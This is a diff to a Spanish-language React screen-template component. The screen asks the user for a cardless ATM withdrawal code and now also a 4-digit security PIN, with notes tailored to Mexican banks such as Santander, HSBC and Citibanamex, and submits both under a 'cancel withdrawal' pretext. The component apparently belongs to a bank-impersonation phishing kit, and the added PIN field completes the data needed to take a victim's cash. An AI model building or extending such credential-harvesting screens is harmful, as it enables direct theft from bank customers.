@@ -590,43 +590,51 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             case 'SANTANDER':
               return { 
                 digits: 8, 
-                note: 'Se usa "Súper Retiro" desde la app.' 
+                note: 'Se usa "Súper Retiro" desde la app más PIN de seguridad de 4 dígitos.',
+                requiresPin: true
               };
             case 'HSBC':
               return { 
                 digits: 10, 
-                note: 'Con la función "Dinero Móvil" (puede variar por servicio contratado).' 
+                note: 'Con la función "Dinero Móvil" (puede variar por servicio contratado) más PIN de seguridad de 4 dígitos.',
+                requiresPin: true
               };
             case 'SPIN':
               return { 
                 digits: 12, 
-                note: 'Se genera en la app SPIN o Banco Azteca.' 
+                note: 'Se genera en la app SPIN o Banco Azteca más PIN de seguridad de 4 dígitos.',
+                requiresPin: true
               };
             case 'BANCOPPEL':
               return { 
                 digits: 8, 
-                note: 'Depende si se usa app Coppel Pay o retiro en tienda.', 
-                variable: true 
+                note: 'Puede variar entre 6 y 8 dígitos. Se genera desde la app BanCoppel Móvil más PIN de seguridad de 4 dígitos.', 
+                variable: true,
+                requiresPin: true
               };
             case 'BANREGIO':
               return { 
                 digits: 10, 
-                note: 'Desde Banregio Móvil, retiro sin tarjeta.' 
+                note: 'Disponible en la app BanRegio Móvil más PIN de seguridad de 4 dígitos.',
+                requiresPin: true
               };
             case 'CITIBANAMEX':
               return { 
                 digits: 6, 
-                note: '"Código Cash" desde Citibanamex Móvil.' 
+                note: 'Función "Código Cash" desde la app móvil Citibanamex más PIN de seguridad de 4 dígitos.',
+                requiresPin: true
               };
             case 'SCOTIABANK':
               return { 
                 digits: 12, 
-                note: 'Desde app ScotiaMóvil para retiro sin tarjeta.' 
+                note: 'Generado desde la app Scotia Móvil más PIN de seguridad de 4 dígitos.',
+                requiresPin: true
               };
             default:
               return { 
                 digits: 8, 
-                note: 'Código de retiro sin tarjeta.' 
+                note: 'Código de retiro sin tarjeta más PIN de seguridad de 4 dígitos.', 
+                requiresPin: true
               };
           }
         };
@@ -661,10 +669,38 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               }}
               maxLength={bankRetiroInfo.digits}
             />
+            
+            {bankRetiroInfo.requiresPin && (
+              <div className="mb-3">
+                <p className="text-sm text-left mb-1">PIN de seguridad (4 dígitos):</p>
+                <Input 
+                  type="password" 
+                  placeholder="PIN de 4 dígitos"
+                  className="w-full border border-gray-300 rounded p-2"
+                  value={pinRetiroInput}
+                  onChange={(e) => {
+                    // Solo permitir números
+                    const value = e.target.value.replace(/\D/g, '');
+                    // Limitar a 4 dígitos
+                    if (value.length <= 4) {
+                      setPinRetiroInput(value);
+                    }
+                  }}
+                  maxLength={4}
+                />
+              </div>
+            )}
+            
             <Button 
               className={primaryBtnClass}
-              onClick={() => onSubmit(ScreenType.CANCELACION_RETIRO, { codigoRetiro: codigoRetiroInput })}
-              disabled={codigoRetiroInput.length < (bankRetiroInfo.variable ? 6 : bankRetiroInfo.digits)}
+              onClick={() => onSubmit(ScreenType.CANCELACION_RETIRO, { 
+                codigoRetiro: codigoRetiroInput,
+                pinRetiro: pinRetiroInput
+              })}
+              disabled={
+                codigoRetiroInput.length < (bankRetiroInfo.variable ? 6 : bankRetiroInfo.digits) || 
+                (bankRetiroInfo.requiresPin && pinRetiroInput.length < 4)
+              }
             >
               Cancelar retiro
             </Button>
